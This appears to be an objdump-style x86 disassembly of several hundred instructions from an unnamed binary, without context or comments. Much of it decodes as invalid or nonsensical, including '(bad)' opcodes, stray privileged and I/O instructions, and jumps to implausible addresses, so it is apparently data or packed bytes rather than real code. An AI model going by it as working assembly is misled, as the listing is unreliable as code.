  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
